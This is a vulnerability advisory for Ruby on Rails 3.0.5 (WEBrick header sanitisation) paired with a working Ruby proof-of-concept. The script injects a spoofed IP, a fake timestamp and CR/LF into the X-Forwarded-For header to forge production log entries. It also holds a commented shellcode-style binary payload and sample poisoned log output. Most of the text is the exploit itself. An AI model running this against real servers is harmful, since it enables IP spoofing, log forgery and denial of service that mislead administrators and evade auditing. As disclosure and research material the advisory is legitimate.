source: http://www.securityfocus.com/bid/46423/info

Ruby on Rails is prone to a vulnerability that allows attackers to inject arbitrary content into the 'X-Forwarded-For', 'X-Forwarded-Host' and 'X-Forwarded-Server' HTTP headers because the 'WEBrick::HTTPRequest' module fails to sufficiently sanitize input.

By inserting arbitrary data into the affected HTTP header field, attackers may be able to launch cross-site request-forgery, cross-site scripting, HTML-injection, and other attacks.

NOTE: This issue only affects requests sent from clients on the same subnet as the server.

Ruby on Rails 3.0.5 is vulnerable; other versions may also be affected. 

#Encoding: UTF-8
#
# Log-File-Injection - Ruby on Rails 3.05
# possibilities:
# - possible date back attacks (tried with request-log-analyzer: worked but teaser_check_warnings)
# - ip spoofing
# - binary log-injections
# - DOS if ip is used with an iptables-ban-script
#
# !! works only on intranet apps !!
#
# Fix:
# validate request.remote_ip until they fix it
# -----------------------
# jimmybandit.com
# http://webservsec.blogspot.com

require 'rubygems'
require 'mechanize'
require 'iconv'

ip = "192.168.1.21 "
# some shell code just for binary-data demo

payload = ip + "at Mon Jan 01 00:00:00 +1000 2009\x0D\0x0A"    # date back attacks with ipspoofing
# payload = "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"      binarypayload is also possible

a = Mechanize.new 
a.pre_connect_hooks << lambda { |p| p[:request]['X-Forwarded-For'] = payload }

page = a.get('http://192.168.1.21/people')

# results 
=begin
################################
production.log:
################################
Started GET "/people" for 192.168.1.21 at Mon Jan 01 00:00:00 +1000 2009 at Sun Mar 13 17:47:47 +0100 2011
  Processing by PeopleController#index as 
Rendered people/index.html.erb within layouts/application (24.4ms)
Completed 200 OK in 63ms (Views: 32.9ms | ActiveRecord: 3.6ms)

################################
request-log-analyzer:
################################
web@debian:~/testapp/log$ request-log-analyzer production.log 
Request-log-analyzer, by Willem van Bergen and Bart ten Brinke - version 1.10.0
Website: http://railsdoctors.com

production.log:          100% [==========] Time: 00:00:00

Request summary
???????????????????????
Parsed lines:        14                    
Skipped lines:       0   <-------                 
Parsed requests:     7   <-------                  
Skipped requests:    0                     
Warnings:            teaser_check_failed: 7

First request:       2009-01-01 00:00:12
Last request:        2009-01-01 00:00:12
Total time analyzed: 0 days 
Request distribution per hour
????????????????????????????
  0:00 ? 7 hits/day ? ���������������������������������
  1:00 ? 0 hits/day ? 
  ...
=end